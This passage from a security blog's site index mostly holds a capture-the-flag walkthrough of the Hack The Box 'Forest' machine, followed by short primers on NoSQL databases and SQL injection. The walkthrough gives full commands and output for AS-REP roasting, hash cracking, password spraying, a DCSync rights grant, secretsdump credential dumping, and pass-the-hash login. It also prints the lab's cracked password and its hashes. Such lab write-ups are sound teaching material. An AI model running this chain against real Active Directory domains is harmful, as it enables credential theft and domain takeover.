htb.local/${i} -dc-ip 10.10.10.161; done Output: Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for Administrator /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for krbtgt /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for sebastein /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for lucinda /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User lucinda doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for svc-alfresco /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) \u0026lt;Hash-Redacted\u0026gt; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for andy /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User andy doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for mark /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User mark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for santi /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User santi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set To get the password I cracked the TGT using hashcat and got the password hashcat -a 0 hash /usr/share/wordlists/rockyou.txt Output: Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 $krb5asrep$23$svc-alfresco@HTB.LOCAL:96ff40e8c8c6d4249819d886c49788a1$......\u0026lt;redacted\u0026gt;:\u0026lt;Password-Redacted\u0026gt; Session..........: hashcat Status...........: Cracked Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP) Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:96ff40e8c8c6d4...fc3980 Time.Started.....: Mon Jan 13 21:57:43 2025 (1 sec) Time.Estimated...: Mon Jan 13 21:57:44 2025 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 6121.8 kH/s (1.69ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 4096000/14344385 (28.55%) Rejected.........: 0/4096000 (0.00%) Restore.Point....: 4079616/14344385 (28.44%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: s9039554h -\u0026gt; s/nd/0s Hardware.Mon.#1..: Temp: 66c Util: 25% Now I have full access over user svc-alfresco (Password is not redacted down here, Enjoy!😉). I initiated password spraying attack on SMB. This is what I usually do when I get a new password. But I didn\u0026rsquo;t get any hit on other accounts, Which is sad 😥 to be honest. ❯ netexec smb htb.local -u users.txt -p \u0026#39;s3rvice\u0026#39; --shares --continue-on-success SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) SMB 10.10.10.161 445 FOREST [-] htb.local\\Administrator:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\krbtgt:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\sebastein:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\lucinda:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [+] htb.local\\svc-alfresco:s3rvice SMB 10.10.10.161 445 FOREST [-] htb.local\\andy:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\mark:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\santi:s3rvice STATUS_LOGON_FAILURE I tried the same on WinRM service and guess what, Bingo! Got winrm access. Even if I got any hit on other accounts earlier it would have been hectic to pivot, hey! anyway less steps to work. ❯ netexec winrm htb.local -u users.txt -p \u0026#39;s3rvice\u0026#39; --continue-on-success WINRM 10.10.10.161 5985 FOREST [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) WINRM 10.10.10.161 5985 FOREST [-] htb.local\\Administrator:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\krbtgt:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\sebastein:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\lucinda:s3rvice WINRM 10.10.10.161 5985 FOREST [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!) WINRM 10.10.10.161 5985 FOREST [-] htb.local\\andy:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\mark:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\santi:s3rvice Got the User flag ❯ evil-winrm -u svc-alfresco -p s3rvice -i htb.local Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents\u0026gt; type ../Desktop/user.txt \u0026lt;redacted\u0026gt; *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents\u0026gt; Privilege escalation # Now using the user account svc_alfresco I collected data for Bloodhound As we can see from the above picture we have genericAll and writeDACL to abuse. We can use the steps from Bloodhound it\u0026rsquo;s pretty neat. Invoking powerview within the shell Import-Module .\\powerview.ps1 This is the one liner Add-DomainGroupMember -Identity \u0026#39;Exchange Windows Permissions\u0026#39; -Members svc-alfresco; $username = \u0026#34;htb\\svc-alfresco\u0026#34;; $password = \u0026#34;s3rvice\u0026#34;; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity \u0026#39;svc-alfresco\u0026#39; -TargetIdentity \u0026#39;HTB.LOCAL\\Domain Admins\u0026#39; -Rights DCSync Atlast I can run secrets dump to dump all those secrets secretsdump.py svc-alfresco:s3rvice@10.10.10.161 Output Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:\u0026lt;redacted\u0026gt;::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f::: htb.local\\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44::: htb.local\\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05::: htb.local\\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a::: htb.local\\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9::: htb.local\\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555::: htb.local\\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5::: htb.local\\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff::: htb.local\\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203::: htb.local\\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355::: htb.local\\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536::: htb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc::: htb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3::: htb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668::: htb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b::: htb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7::: htb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072::: FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:665b84ebfa60399418c8be430aa5704e::: EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1::: [*] Kerberos keys grabbed htb.local\\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913 htb.local\\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375 htb.local\\Administrator:des-cbc-md5:c1e049c71f57343b krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58 krbtgt:des-cbc-md5:9dd5647a31518ca8 htb.local\\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4 htb.local\\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e htb.local\\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e htb.local\\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf htb.local\\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd htb.local\\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e htb.local\\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e htb.local\\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed htb.local\\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983 htb.local\\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91 htb.local\\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f htb.local\\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a htb.local\\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c htb.local\\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8 htb.local\\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d htb.local\\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81 htb.local\\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6 htb.local\\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5 htb.local\\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a htb.local\\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2 htb.local\\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29 htb.local\\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7 htb.local\\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538 htb.local\\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702 htb.local\\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352 htb.local\\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d htb.local\\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701 htb.local\\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd htb.local\\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36 htb.local\\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb htb.local\\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c htb.local\\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3 htb.local\\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054 htb.local\\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161 htb.local\\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a htb.local\\sebastien:des-cbc-md5:702a3445e0d65b58 htb.local\\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5 htb.local\\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad htb.local\\lucinda:des-cbc-md5:a13bb56bd043a2ce htb.local\\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32 htb.local\\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea htb.local\\svc-alfresco:des-cbc-md5:014ac86d0b98294a htb.local\\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f htb.local\\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6 htb.local\\andy:des-cbc-md5:a2ab5eef017fb9da htb.local\\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6 htb.local\\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81 htb.local\\mark:des-cbc-md5:b5dff1f40b8f3be9 htb.local\\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427 htb.local\\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25 htb.local\\santi:des-cbc-md5:4075ad528ab9e5fd FOREST$:aes256-cts-hmac-sha1-96:7711cbb5ca057223c6f7ea9c86392d52020d6f274c2ed0233778b0f7c6e2fb42 FOREST$:aes128-cts-hmac-sha1-96:b155f92cca7761d7b6683ac144182318 FOREST$:des-cbc-md5:c8132fbf73c71fa8 EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6 EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e EXCH01$:des-cbc-md5:8c45f44c16975129 [*] Cleaning up... We got everything we can, \u0026ldquo;we\u0026rdquo; successfully acheived a hacker\u0026rsquo;s dream, Logged in using winrm as administrator and got the Root flag ❯ evil-winrm -u administrator -H 32693b\u0026lt;hidden\u0026gt; -i htb.local Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; type ../Desktop/root.txt \u0026lt;redacted\u0026gt; ","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741345035294-forest-writeuphtb/","section":"Posts","summary":"","title":"Forest Walkthrough(HTB)","type":"posts"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/info/","section":"Tags","summary":"","title":"Info","type":"tags"},{"content":" A non-relational database does not use tables, rows, columns, primary keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.\nDue to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing our data.\nThere are 4 common storage models for NoSQL databases:\nKey-Value Document-Based Wide-Column Graph Each of the above models has a different way of storing data. For example, the Key-Value model usually stores data in JSON or XML, and has a key for each pair, storing all of its data as its value:\ngraph LR subgraph Posts box1[id\ndate\ncontent] box2[id\ndate\ncontent] box3[id\ndate\ncontent] end box1 --\u003e Key1[Key] box1 --\u003e Value1[Value] box2 --\u003e Key2[Key] box2 --\u003e Value2[Value] box3 --\u003e Key3[Key] box3 --\u003e Value3[Value] The above example can be represented using JSON as follows: { \u0026#34;100001\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;01-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Welcome to this web application.\u0026#34; }, \u0026#34;100002\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;02-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;This is the first post on this web app.\u0026#34; }, \u0026#34;100003\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;02-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Reminder: Tomorrow is the ...\u0026#34; } } It looks similar to a dictionary/map/key-value pair in languages like Python or PHP \u0026lsquo;i.e. {'key':'value'}\u0026rsquo;, where the key is usually a string, the value can be a string, dictionary, or any class object.\nThe Document-Based model stores data in complex JSON objects and each object has certain meta-data while storing the rest of the data similarly to the Key-Value model.\nSome of the most common NoSQL databases include:\nType Description MongoDB The most common NoSQL database. It is free and open-source, uses the Document-Based model, and stores data in JSON objects ElasticSearch Another free and open-source NoSQL database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient Apache Cassandra Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values Other common NoSQL databases include: Redis, Neo4j, CouchDB, and Amazon DynamoDB. ","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741344317221-non-relational-nosql/","section":"Posts","summary":"","title":"Non-relational (NoSQL)","type":"posts"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/server/","section":"Tags","summary":"","title":"Server","type":"tags"},{"content":" Very common vulnerability in web applications is a SQL Injection vulnerability. Similarly to a Command Injection vulnerability, this vulnerability may occur when the web application executes a SQL query, including a value taken from user-supplied input.\nFor example, in the database section, we saw an example of how a web application would use user-input to search within a certain table, with the following line of code:\n$query = \u0026#34;select * from users where name like \u0026#39;%$searchInput%\u0026#39;\u0026#34;; If the user input is not properly filtered and validated (as is the case with Command Injections), we may execute another SQL query alongside this query, which may eventually allow us to take control over the database and its hosting server.\nFor example, the same previous College Management System 1.2 suffers from a SQL injection vulnerability, in which we can execute another SQL query that always returns true, meaning we successfully authenticated, which allows us to log in to the application. We can use the same vulnerability to retrieve data from the database or even gain control over the hosting server.\n","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741343014156-sql-injection/","section":"Posts","summary":"","title":"SQl-Injection","type":"posts"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","externalUrl":null,"permalink":"/Secure-The-Throne/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/Secure-The-Throne/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"}]